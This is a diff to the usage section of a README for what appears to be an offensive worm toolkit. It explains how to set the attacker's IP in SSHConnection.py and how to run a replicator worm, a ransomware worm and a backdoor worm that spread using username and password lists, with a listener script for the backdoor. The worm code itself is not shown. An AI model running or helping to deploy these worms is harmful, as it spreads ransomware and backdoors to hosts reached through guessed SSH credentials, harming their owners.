@@ -2,14 +2,17 @@ USAGE
 
 Replace top line in SSHConnection.py with attacker's IP
 
+Every username and password file needs to be named usernames.text and passwords.txt
 
 Replicator Worm
 $ python replicator.py usernames.txt passwords.txt
 
 Ransom Worm
-$ python replicator.py local_attack.py usernames.txt passwords.txt
+$ python replicator.py local_ransom.py usernames.txt passwords.txt
 
 Backdoor Worm
 $ python recv.py
 (in new tab)
 $ python replicator.py local_backdoor.py usernames.txt passwords.txt
+
+Note: runing recv.py isn't necessary for the backdoor to work, it is just a listener
